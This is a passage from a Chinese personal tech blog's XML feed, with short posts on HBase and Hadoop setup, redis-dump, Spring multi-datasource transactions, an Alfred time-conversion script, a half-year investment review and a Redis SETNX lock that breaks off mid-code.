        <content type="html"><![CDATA[<p>HBase 安装需要先安装 Hadoop，底层依赖。相对来讲 HBase 的安装相对简单很多，通常情况下只需要更改下 hbase-site.xml 就可以了，存储都交由 hdfs 管理。</p><p>改一个配置文件</p><p>conf&#x2F;hbase-site.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.rootdir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>hdfs://localhost:9000/hbase<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.cluster.distributed<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可能出现错误无法找到 <code>Error: JAVA_HOME is not set</code>，设置 <code>conf/hbase-env.sh</code> 中 JAVA_HOME 为正确的路径</p><p><img src="/assets/images/hbase.png"></p>]]></content>
      
      
      <categories>
          
          <category> Big Data </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HBase </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redis-dump</title>
      <link href="/2017/07/17/redis-dump/"/>
      <url>/2017/07/17/redis-dump/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://github.com/delano/redis-dump">Github redis-dump</a></li></ul><p>在尝试的过程中，有一个问题需要注意：</p><p>如果一个redis里面已经存在了某一个key，在<code>redis-load</code>的时候不能覆盖掉。</p><p>load的时候，不会删掉redis已经存在的数据。</p><p>测试简单的redis数据结构,key-value &#x2F; hash set ／list 没有问题，建议使用的时候先测试下自己的数据结构能不能load成功回来。</p>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hadoop遇到的问题</title>
      <link href="/2017/07/17/Hadoop%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/"/>
      <url>/2017/07/17/Hadoop%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="http://hadoop.apache.org/docs/r2.8.0/hadoop-project-dist/hadoop-common/SingleCluster.html">SingleCluster install</a></li><li><a href="http://blog.csdn.net/jack85986370/article/details/51902871">解决 Unable to load native-hadoop library for your platform</a></li><li>如果提示<code>core-site.xml</code>无法找到可以检查一下环境变量是否配置正确了。我遇到是因为之前的版本升级改了profile，忘了source了。</li><li>看日志如果无法启动，提示有<code>account.jetbrains.com</code> 可能原因是<code>/ets/hosts</code>加了idea的激活ip</li></ul>]]></content>
      
      
      <categories>
          
          <category> Big Data </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hadoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux中wheel组的概念</title>
      <link href="/2017/07/13/Linux%E4%B8%ADwheel%E7%BB%84%E7%9A%84%E6%A6%82%E5%BF%B5/"/>
      <url>/2017/07/13/Linux%E4%B8%ADwheel%E7%BB%84%E7%9A%84%E6%A6%82%E5%BF%B5/</url>
      
        <content type="html"><![CDATA[<p>同事每次给我创建用户都没弄对，不能切换root，vim &#x2F;etc&#x2F;group 中 wheel 组配置有问题。</p><ul><li><a href="http://www.cnblogs.com/codingnutter/p/5634494.html">Linux中wheel组的概念</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linix </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSH 代理详细解释</title>
      <link href="/2017/07/12/ssh%20%E4%BB%A3%E7%90%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E9%87%8A/"/>
      <url>/2017/07/12/ssh%20%E4%BB%A3%E7%90%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E9%87%8A/</url>
      
        <content type="html"><![CDATA[<p>老是记不清楚这几个参数，又不想去看一大堆的man</p><ul><li><a href="http://www.cnblogs.com/wangkangluo1/archive/2011/06/29/2093727.html">SSH 代理详细解释</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring 多数据源</title>
      <link href="/2017/07/04/Spring%20%E5%A4%9A%E6%95%B0%E6%8D%AE%E6%BA%90/"/>
      <url>/2017/07/04/Spring%20%E5%A4%9A%E6%95%B0%E6%8D%AE%E6%BA%90/</url>
      
        <content type="html"><![CDATA[<p>可以使用切片，实现<code>AbstractRoutingDataSource</code>，这样的做法可以做更多的有想象的事，因为完全自己操作数据源的选择，可参考链接来实现</p><p><a href="https://lanjingling.github.io/2016/02/15/spring-aop-dynamicdatasource/">基于 spring 的 aop 实现多数据源动态切换</a></p><p>多数据源的另一种就是，在 SpringApplicationContext.xml 中配置多个 datasource，并指定不同的 mapper。这样存在的问题就是在运行中会提示事务非 spring 管理。新增事务部分切片配置。默认的 Spring 只能管理一个事务。</p><span id="more"></span><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[2017-06-15 17:02:37.424] [DEBUG] [http-nio-9100-exec-1] org.mybatis.spring.SqlSessionUtils [SqlSessionUtils.java:148] - SqlSession [org.apache.ibatis.session.defaults.DefaultSqlSession@4d86a13] was not registered <span class="keyword">for</span> synchronization because synchronization is not active</span><br><span class="line">[2017-06-15 17:02:37.425] [DEBUG] [http-nio-9100-exec-1] o.m.s.t.SpringManagedTransaction [SpringManagedTransaction.java:87] - JDBC Connection [com.alibaba.druid.proxy.jdbc.ConnectionProxyImpl@6b6caaa2] will not be managed by Spring</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 事务传播特性配置 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tx:advice</span> <span class="attr">id</span>=<span class="string">&quot;infoTransactionAdvice&quot;</span> <span class="attr">transaction-manager</span>=<span class="string">&quot;infoTxManager&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tx:attributes</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;insert&quot;</span> <span class="attr">propagation</span>=<span class="string">&quot;REQUIRED&quot;</span> <span class="attr">rollback-for</span>=<span class="string">&quot;Exception&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;delete*&quot;</span> <span class="attr">propagation</span>=<span class="string">&quot;REQUIRED&quot;</span> <span class="attr">rollback-for</span>=<span class="string">&quot;Exception&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;update*&quot;</span> <span class="attr">propagation</span>=<span class="string">&quot;REQUIRED&quot;</span> <span class="attr">rollback-for</span>=<span class="string">&quot;Exception&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;get*&quot;</span> <span class="attr">read-only</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;find*&quot;</span> <span class="attr">read-only</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tx:attributes</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tx:advice</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 配置哪些方法参与事务 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">aop:config</span> <span class="attr">proxy-target-class</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:pointcut</span> <span class="attr">id</span>=<span class="string">&quot;infoTransactionxPointcut&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;execution(* com.chinawayltd.sms.schedule.mapper.info.*.*(..))&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:advisor</span> <span class="attr">advice-ref</span>=<span class="string">&quot;infoTransactionAdvice&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;infoTransactionxPointcut&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 事务传播特性配置 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tx:advice</span> <span class="attr">id</span>=<span class="string">&quot;transactionAdvice&quot;</span> <span class="attr">transaction-manager</span>=<span class="string">&quot;smsTxManager&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tx:attributes</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;insert&quot;</span> <span class="attr">propagation</span>=<span class="string">&quot;REQUIRED&quot;</span> <span class="attr">rollback-for</span>=<span class="string">&quot;Exception&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;delete*&quot;</span> <span class="attr">propagation</span>=<span class="string">&quot;REQUIRED&quot;</span> <span class="attr">rollback-for</span>=<span class="string">&quot;Exception&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;update*&quot;</span> <span class="attr">propagation</span>=<span class="string">&quot;REQUIRED&quot;</span> <span class="attr">rollback-for</span>=<span class="string">&quot;Exception&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;get*&quot;</span> <span class="attr">read-only</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;find*&quot;</span> <span class="attr">read-only</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tx:attributes</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tx:advice</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 配置哪些方法参与事务 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">aop:config</span> <span class="attr">proxy-target-class</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:pointcut</span> <span class="attr">id</span>=<span class="string">&quot;transactionxPointcut&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;execution(* com.chinawayltd.sms.schedule.mapper.sms.*.*(..))&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:advisor</span> <span class="attr">advice-ref</span>=<span class="string">&quot;transactionAdvice&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;transactionxPointcut&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2017上半年投资篇小结</title>
      <link href="/2017/07/01/2017%E4%B8%8A%E5%8D%8A%E5%B9%B4%E6%8A%95%E8%B5%84%E7%AF%87%E5%B0%8F%E7%BB%93/"/>
      <url>/2017/07/01/2017%E4%B8%8A%E5%8D%8A%E5%B9%B4%E6%8A%95%E8%B5%84%E7%AF%87%E5%B0%8F%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>2017年已经过去了一半了，仔细想了一下，时间过的真快。</p><p>这里小结下上半年的历程。</p><p>请务必相信这一条铁律：<font color=red><strong>任何时候控制住风险、控制回撤、控制诱惑、控制贪婪！！！</strong></font></p><span id="more"></span><p>前期1、2月份的时候，主要投资思路在于JoinQuant上面编写量化策略，该策略一定环境下有正alpha，但是不同行情中不够稳定，加上1、2月份在思考离职的事情，有时候策略提示不够及时，或者说买入的时候并不符合自己的操作策略，所以策略在这两个月出现了比较大的波动，总体来讲，一亏一赢，并无亏损。</p><p>之后三月正式离职，丽江大理走了一圈。比较开心的事，在即将启程离开大理回成都的那天，收到了新股中签的通知，于是带来了四月的一个好的收益。同时，四月大盘其实走势并不好，仓位中有股票还是走的量化策略的，有好多次和自己的判断违背，但是妥协了，加之存在判断失误，本该有更多余的收益，结果被我弄丢，实在是可惜。</p><p>5月正式加入新公司，由于新公司网络限制不能上股票财经累的网站，所以只能偶尔看一下盘。慢慢也就习惯了不怎么看，晚上分析一下下，5月走势一般，筑底盘整中。朋友借钱，个人资金也有点紧，但是又不愿意错过这样的地位，于是支付宝借呗弄了两万五补仓，还好，五月没亏，6月一样，是不是看看，得益于指数满满走强，有几个点的收益，还算不错。</p><p>忌频繁操作、有理论依据支撑、有酿酒那样的耐心、相信自己，反思，总结。大环境、行业热点、行业龙头、资金青睐。</p><p>下半年展望，保持较久级别的仓位，尽量配合自己的时间来操作，适当时候空仓或者做低风险的票，又或者是逆回购。个人判断，下半年会有结构性的小行情，存在机会。但是个人来说下半年有一笔大额支出，会导致仓位容量减少，这个比较不爽。再说吧，适当时刻再支付宝或者其他渠道融资。</p><p>加油！</p>]]></content>
      
      
      <categories>
          
          <category> Finance </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 投资 </tag>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Alfred workflows Times插件</title>
      <link href="/2017/06/22/Alfred%E6%97%B6%E9%97%B4%E8%BD%AC%E6%8D%A2%E6%8F%92%E4%BB%B6/"/>
      <url>/2017/06/22/Alfred%E6%97%B6%E9%97%B4%E8%BD%AC%E6%8D%A2%E6%8F%92%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<p><img src="/assets/images/alfred_times_default.png"></p><p><img src="/assets/images/alfred_times_with_parm.png"></p><p>在Alfred中新增一个workflow，keywords为times，参数可选。</p><span id="more"></span><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> alfred.feedback <span class="keyword">import</span> Feedback</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_feedback_results</span>(<span class="params">now</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Generate the feedback results.&#x27;&#x27;&#x27;</span></span><br><span class="line">    fb = Feedback()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> now == <span class="number">0</span>:</span><br><span class="line">        kwargsOfMilliseconds = &#123;</span><br><span class="line">            <span class="string">&#x27;title&#x27;</span>: datetime.datetime.now().strftime(<span class="string">&#x27;%Y-%m-%d&#x27;</span>),</span><br><span class="line">            <span class="string">&#x27;subtitle&#x27;</span>: <span class="string">u&#x27;当前日期&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;arg&#x27;</span>: <span class="string">&#x27;%s\n%s&#x27;</span> % (datetime.datetime.now().strftime(<span class="string">&#x27;%Y-%m-%d&#x27;</span>), <span class="string">u&#x27;当前日期&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        fb.addItem(**kwargsOfMilliseconds)</span><br><span class="line"></span><br><span class="line">        kwargsOfSecondIsofomat = &#123;</span><br><span class="line">            <span class="string">&#x27;title&#x27;</span>: datetime.datetime.now().strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>),</span><br><span class="line">            <span class="string">&#x27;subtitle&#x27;</span>: <span class="string">u&#x27;当前日期&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;arg&#x27;</span>: <span class="string">&#x27;%s\n%s&#x27;</span> % (datetime.datetime.now().strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>), <span class="string">u&#x27;当前日期&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        fb.addItem(**kwargsOfSecondIsofomat)</span><br><span class="line"></span><br><span class="line">        kwargsOfMilliseconds = &#123;</span><br><span class="line">            <span class="string">&#x27;title&#x27;</span>: datetime.datetime.now().strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S.%f&#x27;</span>),</span><br><span class="line">            <span class="string">&#x27;subtitle&#x27;</span>: <span class="string">u&#x27;当前日期&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;arg&#x27;</span>: <span class="string">&#x27;%s\n%s&#x27;</span> % (datetime.datetime.now().strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S.%f&#x27;</span>), <span class="string">u&#x27;当前日期&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        fb.addItem(**kwargsOfMilliseconds)</span><br><span class="line">        </span><br><span class="line">        kwargsOfSeconds = &#123;</span><br><span class="line">            <span class="string">&#x27;title&#x27;</span>: <span class="built_in">str</span>(time.time()),</span><br><span class="line">            <span class="string">&#x27;subtitle&#x27;</span>: <span class="string">u&#x27;当前日期&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;arg&#x27;</span>: <span class="string">&#x27;%s\n%s&#x27;</span> % (<span class="built_in">str</span>(time.time()), <span class="string">u&#x27;当前日期&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        fb.addItem(**kwargsOfSeconds)</span><br><span class="line"></span><br><span class="line">        kwargsOfMilliseconds = &#123;</span><br><span class="line">            <span class="string">&#x27;title&#x27;</span>: <span class="built_in">str</span>(time.time() * <span class="number">1000</span>),</span><br><span class="line">            <span class="string">&#x27;subtitle&#x27;</span>: <span class="string">u&#x27;当前日期&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;arg&#x27;</span>: <span class="string">&#x27;%s\n%s&#x27;</span> % (<span class="built_in">str</span>(time.time() * <span class="number">1000</span>), <span class="string">u&#x27;当前日期&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        fb.addItem(**kwargsOfMilliseconds)</span><br><span class="line">       </span><br><span class="line">    <span class="keyword">elif</span> long(now) &gt; <span class="number">0</span>:</span><br><span class="line">        timeWithNomal = datetime.datetime.fromtimestamp(now).strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>)</span><br><span class="line">        timeWithMilliseconds = datetime.datetime.fromtimestamp(now).strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S.%f&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        title = timeWithMilliseconds</span><br><span class="line">        subtitle = <span class="string">u&#x27;毫秒时间&#x27;</span></span><br><span class="line">        kwargsOfMilliseconds = &#123;</span><br><span class="line">            <span class="string">&#x27;title&#x27;</span>: title,</span><br><span class="line">            <span class="string">&#x27;subtitle&#x27;</span>: subtitle,</span><br><span class="line">            <span class="string">&#x27;arg&#x27;</span>: <span class="string">&#x27;%s\n%s&#x27;</span> % (title, subtitle)</span><br><span class="line">        &#125;</span><br><span class="line">        fb.addItem(**kwargsOfMilliseconds)</span><br><span class="line"></span><br><span class="line">        title = timeWithNomal</span><br><span class="line">        subtitle = <span class="string">u&#x27;标准时间&#x27;</span></span><br><span class="line">        kwargsOfNormal = &#123;</span><br><span class="line">            <span class="string">&#x27;title&#x27;</span>: title,</span><br><span class="line">            <span class="string">&#x27;subtitle&#x27;</span>: subtitle,</span><br><span class="line">            <span class="string">&#x27;arg&#x27;</span>: <span class="string">&#x27;%s\n%s&#x27;</span> % (title, subtitle)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        fb.addItem(**kwargsOfNormal)</span><br><span class="line"></span><br><span class="line">    fb.output()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;The main entry.&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># Note: do not use single quote here, because Alfred doesn&#x27;t give choice to</span></span><br><span class="line">    <span class="comment"># escape a single quote.</span></span><br><span class="line">    now = <span class="string">&quot;&#123;query&#125;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">str</span>(now)) == <span class="number">0</span>:</span><br><span class="line">        now = long(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(<span class="built_in">str</span>(now)) &gt; <span class="number">10</span>:</span><br><span class="line">        now = long(now) / <span class="number">1000</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        now = long(now)</span><br><span class="line">    generate_feedback_results(now)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Alfred </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis锁</title>
      <link href="/2017/06/09/Redis%E9%94%81/"/>
      <url>/2017/06/09/Redis%E9%94%81/</url>
      
        <content type="html"><![CDATA[<h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>在程序多开的情况下，锁实现只有一个Timer，或者说Schedule运行。通过Redis 的 setnx命令实现。类似也可以利用zookeeper来做。  </p><h3 id="参考redis文档"><a href="#参考redis文档" class="headerlink" title="参考redis文档"></a>参考redis文档</h3><p><font color='red'><strong>SETNX key value</strong></font></p><p>将 key 的值设为 value ，当且仅当 key 不存在。</p><p>若给定的 key 已经存在，则 SETNX 不做任何动作。</p><p>SETNX 是『SET if Not eXists』(如果不存在，则 SET)的简写。</p><span id="more"></span><p><strong>可用版本</strong>：&gt;&#x3D; 1.0.0<br><strong>时间复杂度</strong>：O(1)<br><strong>返回值：</strong><br>设置成功，返回 1 。<br>设置失败，返回 0 。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">redis&gt; EXISTS job                <span class="comment"># job 不存在</span></span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line"></span><br><span class="line">redis&gt; SETNX job <span class="string">&quot;programmer&quot;</span>    <span class="comment"># job 设置成功</span></span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line"></span><br><span class="line">redis&gt; SETNX job <span class="string">&quot;code-farmer&quot;</span>   <span class="comment"># 尝试覆盖 job ，失败</span></span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line"></span><br><span class="line">redis&gt; GET job                   <span class="comment"># 没有被覆盖</span></span><br><span class="line"><span class="string">&quot;programmer&quot;</span></span><br></pre></td></tr></table></figure><h3 id="JAVA实现"><a href="#JAVA实现" class="headerlink" title="JAVA实现"></a>JAVA实现</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> StringRedisTemplate redisTemplate;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LOCK_KEY</span> <span class="operator">=</span> <span class="string">&quot;lock:&quot;</span> + getClass().getSimpleName();</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">_getLock</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">expireAtString</span> <span class="operator">=</span> redisTemplate.opsForValue().get(LOCK_KEY);</span><br><span class="line">    <span class="keyword">if</span> (expireAtString != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">long</span> <span class="variable">expireAt</span> <span class="operator">=</span> Long.valueOf(expireAtString);</span><br><span class="line">        <span class="keyword">if</span> (expireAt &gt; System.currentTimeMillis()) &#123;</span><br><span class="line">            logger.info(<span class="string">&quot;[开始][当前锁已被其他线程占领:&#123;&#125;][过期时间:&#123;&#125;]&quot;</span>, LOCK_KEY, expireAtString);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            logger.info(<span class="string">&quot;[开始][当前锁已过期:&#123;&#125;][删除]&quot;</span>, LOCK_KEY);</span><br><span class="line">            redisTemplate.delete(LOCK_KEY);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">expire</span> <span class="operator">=</span> String.valueOf(DateTime.now().plusMinutes(<span class="number">1</span>).toDate().getTime());</span><br><span class="line">    logger.info(<span class="string">&quot;[开始][准备获取锁:&#123;&#125; expire at &#123;&#125;]&quot;</span>, 